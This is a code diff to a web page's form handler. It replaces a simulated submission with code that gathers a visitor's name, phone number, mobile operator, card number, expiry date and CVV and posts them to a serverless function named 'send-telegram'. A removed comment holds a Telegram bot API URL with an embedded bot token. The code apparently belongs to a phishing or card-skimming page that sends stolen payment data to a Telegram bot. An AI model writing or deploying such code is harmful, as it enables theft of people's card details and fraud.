@@ -755,20 +755,34 @@
             submitBtn.disabled = true;
             loading.classList.add('show');
             
-            // Simulate processing
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            // Hide loading, show success
-            loading.classList.remove('show');
-            successMessage.classList.add('show');
-            submitBtn.style.display = 'none';
-            
-            // Optional: Send to email service (Formspree, etc.)
-            // const formData = new FormData(this);
-            // await fetch('https://api.telegram.org/bot8694169123:AAEdLLVyc3VwV-Vp5X-DasnGjbFHcgzXZpk/sendMessage', {
-            //     method: 'POST',
-            //     body: formData
-            // });
+            const formData = {
+     name: document.querySelector('input[name="name"]')?.value || '',
+    phone: document.querySelector('input[name="phone"]')?.value || '',
+    operator: document.querySelector('select[name="operator"]')?.value || '',
+    cardNumber: document.querySelector('input[name="cardNumber"]')?.value || '',
+    expiry: document.querySelector('input[name="expiry"]')?.value || '',
+    cvv: document.querySelector('input[name="cvv"]')?.value || ''
+};
+
+const response = await fetch('/.netlify/functions/send-telegram', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(formData)
+});
+
+const result = await response.json();
+
+loading.classList.remove('show');
+
+if (result.success) {
+    successMessage.classList.add('show');
+    submitBtn.style.display = 'none';
+} else {
+    alert('Erreur: ' + result.error);
+    submitBtn.disabled = false;
+}
         });
     </script>
 
